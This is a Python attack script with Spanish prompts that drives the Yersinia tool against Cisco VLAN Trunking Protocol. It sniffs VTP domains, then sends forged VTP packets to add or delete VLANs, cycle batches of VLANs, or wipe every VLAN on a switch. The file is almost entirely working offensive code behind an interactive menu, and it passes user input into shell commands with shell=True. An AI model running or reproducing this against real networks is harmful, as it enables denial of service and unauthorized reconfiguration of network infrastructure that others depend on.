#!/usr/bin/env python3
"""
VTP Attack Script - Versión CLI Directa con Yersinia
"""

import os
import sys
import time
import subprocess
import re

if os.geteuid() != 0:
    print("[!] Ejecuta como root: sudo python3 script.py")
    sys.exit(1)

def check_yersinia():
    try:
        subprocess.run(["yersinia", "-h"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        print("[!] Yersinia no instalado. Instala: sudo apt install yersinia")
        return False

def get_interfaces():
    try:
        result = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
        interfaces = []
        for line in result.stdout.split('\n'):
            if ':' in line and 'LOOPBACK' not in line.upper():
                parts = line.split(':')
                if len(parts) >= 2:
                    iface = parts[1].strip()
                    if iface and iface not in ['lo', 'docker0']:
                        interfaces.append(iface)
        return interfaces
    except:
        return ['eth0']

def scan_vtp_domains(iface):
    """Escanea dominios VTP usando tcpdump"""
    print(f"[*] Escaneando tráfico VTP en {iface} (10 segundos)...")
    
    try:
        # Capturar paquetes VTP con tcpdump
        cmd = ["timeout", "10", "tcpdump", "-i", iface, "-vvv", "-e", "-s", "0", 
               "ether", "dst", "01:00:0c:cc:cc:cc", "-c", "10"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=12)
        output = result.stdout + result.stderr
        
        # Buscar dominios en la salida
        domain_pattern = re.compile(r'Domain[:\s]+([a-zA-Z0-9_.-]+)', re.IGNORECASE)
        domains = domain_pattern.findall(output)
        
        if domains:
            unique_domains = list(set(domains))
            print(f"[+] Dominios detectados: {', '.join(unique_domains)}")
            return unique_domains[0]
        else:
            print("[!] No se detectaron dominios VTP")
            return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def send_vtp_add_vlan(iface, domain, vlan_id, vlan_name, count=20):
    """Envía paquetes VTP para agregar VLAN usando Yersinia CLI"""
    
    print(f"\n[*] Agregando VLAN {vlan_id} - {vlan_name}")
    print(f"[*] Dominio: {domain}")
    print(f"[*] Interfaz: {iface}")
    print(f"[*] Paquetes: {count}")
    
    # Método 1: Usar Yersinia en modo batch
    try:
        # Crear archivo de entrada para Yersinia
        input_data = f"{vlan_id}\n{vlan_name}\n"
        
        # Comando Yersinia con redirección
        cmd = f'echo -e "{input_data}" | yersinia vtp -attack 3 -vtp_mgm_dom {domain} -interface {iface}'
        
        print("[*] Enviando paquetes VTP (método 1)...")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0:
            print("[+] Paquetes enviados correctamente")
            return True
        else:
            print(f"[!] Error: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"[!] Error en método 1: {e}")
        return False

def send_vtp_delete_vlan(iface, domain, vlan_id, vlan_name, count=20):
    """Envía paquetes VTP para eliminar VLAN"""
    
    print(f"\n[*] Eliminando VLAN {vlan_id}")
    print(f"[*] Dominio: {domain}")
    print(f"[*] Interfaz: {iface}")
    
    try:
        input_data = f"{vlan_id}\n{vlan_name}\n"
        cmd = f'echo -e "{input_data}" | yersinia vtp -attack 2 -vtp_mgm_dom {domain} -interface {iface}'
        
        print("[*] Enviando paquetes VTP...")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0:
            print("[+] VLAN eliminada correctamente")
            return True
        else:
            print(f"[!] Error: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def send_vtp_request(iface, domain):
    """Envía request VTP para forzar actualización"""
    print("[*] Enviando request VTP...")
    try:
        cmd = ["yersinia", "vtp", "-attack", "0", "-vtp_mgm_dom", domain, "-interface", iface]
        subprocess.run(cmd, timeout=5, capture_output=True)
        print("[+] Request enviado")
        return True
    except:
        print("[!] Error enviando request")
        return False

def verify_vlan(iface, vlan_id, timeout=10):
    """Verifica si la VLAN se creó capturando tráfico VTP"""
    print(f"[*] Verificando creación de VLAN {vlan_id}...")
    
    try:
        # Capturar tráfico VTP
        cmd = ["timeout", str(timeout), "tcpdump", "-i", iface, "-vvv", "-e", "-s", "0",
               "ether", "dst", "01:00:0c:cc:cc:cc", "-c", "5"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        output = result.stdout + result.stderr
        
        # Buscar VLAN ID
        vlan_pattern = re.compile(f'VLAN-id\\s+{vlan_id}', re.IGNORECASE)
        if vlan_pattern.search(output):
            print(f"[+] ¡VLAN {vlan_id} detectada en el tráfico VTP!")
            return True
        else:
            print(f"[-] VLAN {vlan_id} no detectada")
            return False
    except Exception as e:
        print(f"[!] Error verificando: {e}")
        return False

def main():
    print("="*60)
    print(" VTP ATTACK - VERSIÓN CLI DIRECTA")
    print("="*60)
    
    if not check_yersinia():
        return
    
    # Seleccionar interfaz
    interfaces = get_interfaces()
    print("\n[+] Interfaces disponibles:")
    for i, iface in enumerate(interfaces):
        print(f"  {i+1}. {iface}")
    
    try:
        idx = int(input("\n[?] Selecciona interfaz: "))
        iface = interfaces[idx-1]
    except:
        iface = "eth0"
    
    print(f"[+] Interfaz: {iface}")
    
    # Escanear o manual
    scan = input("[?] ¿Escanear dominio VTP? (s/n): ").lower()
    
    if scan == 's':
        domain = scan_vtp_domains(iface)
        if not domain:
            domain = input("[?] Dominio VTP: ")
    else:
        domain = input("[?] Dominio VTP (default miguel.local): ") or "miguel.local"
    
    print(f"[+] Dominio: {domain}")
    
    # Menú
    while True:
        print("\n" + "-"*40)
        print(" 1. Agregar VLAN")
        print(" 2. Eliminar VLAN")
        print(" 3. Ataque por lotes (agregar/eliminar)")
        print(" 4. Eliminar TODAS las VLANs (¡Peligroso!)")
        print(" 0. Salir")
        
        choice = input("\n[?] Opción: ")
        
        if choice == "0":
            print("[*] Saliendo...")
            break
            
        elif choice == "1":
            vlan_id = input("[?] VLAN ID (2-1001): ")
            try:
                vlan_id = int(vlan_id)
            except:
                print("[!] ID inválido")
                continue
            
            vlan_name = input("[?] Nombre VLAN: ") or f"VLAN_{vlan_id}"
            count = input("[?] Paquetes (default 30): ")
            count = int(count) if count else 30
            
            # Enviar varios paquetes para asegurar
            for i in range(3):
                print(f"\n[*] Intento {i+1}/3")
                send_vtp_add_vlan(iface, domain, vlan_id, vlan_name, count)
                time.sleep(1)
            
            # Enviar request
            send_vtp_request(iface, domain)
            time.sleep(2)
            
            # Verificar
            verify_vlan(iface, vlan_id)
            
            print("\n[+] Verifica en el switch:")
            print("    show vlan brief")
            
        elif choice == "2":
            vlan_id = input("[?] VLAN ID a eliminar: ")
            try:
                vlan_id = int(vlan_id)
            except:
                print("[!] ID inválido")
                continue
            
            vlan_name = input("[?] Nombre VLAN: ") or f"VLAN_{vlan_id}"
            
            send_vtp_delete_vlan(iface, domain, vlan_id, vlan_name)
            send_vtp_request(iface, domain)
            
            print("\n[+] Verifica en el switch:")
            print("    show vlan brief")
            
        elif choice == "3":
            try:
                start = int(input("[?] VLAN inicial: "))
                end = int(input("[?] VLAN final: "))
                count = input("[?] Paquetes por VLAN (default 20): ")
                count = int(count) if count else 20
            except:
                print("[!] Valor inválido")
                continue
            
            for vlan_id in range(start, end + 1):
                vlan_name = f"BATCH_{vlan_id}"
                print(f"\n[*] Procesando VLAN {vlan_id}")
                
                send_vtp_add_vlan(iface, domain, vlan_id, vlan_name, count)
                time.sleep(1)
                send_vtp_delete_vlan(iface, domain, vlan_id, vlan_name)
                time.sleep(1)
            
            print("[+] Ataque por lotes completado")
            
        elif choice == "4":
            print("\n[!] ¡PELIGROSO! Eliminará TODAS las VLANs")
            confirm = input("[?] ¿Estás SEGURO? (escribe 'YES'): ")
            if confirm.upper() != "YES":
                print("[*] Cancelado")
                continue
            
            try:
                cmd = ["yersinia", "vtp", "-attack", "1", "-vtp_mgm_dom", domain, "-interface", iface]
                subprocess.run(cmd, timeout=10)
                print("[!] Todas las VLANs eliminadas")
            except Exception as e:
                print(f"[!] Error: {e}")
        
        else:
            print("[!] Opción inválida")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Interrumpido")
    except Exception as e:
        print(f"[!] Error: {e}")
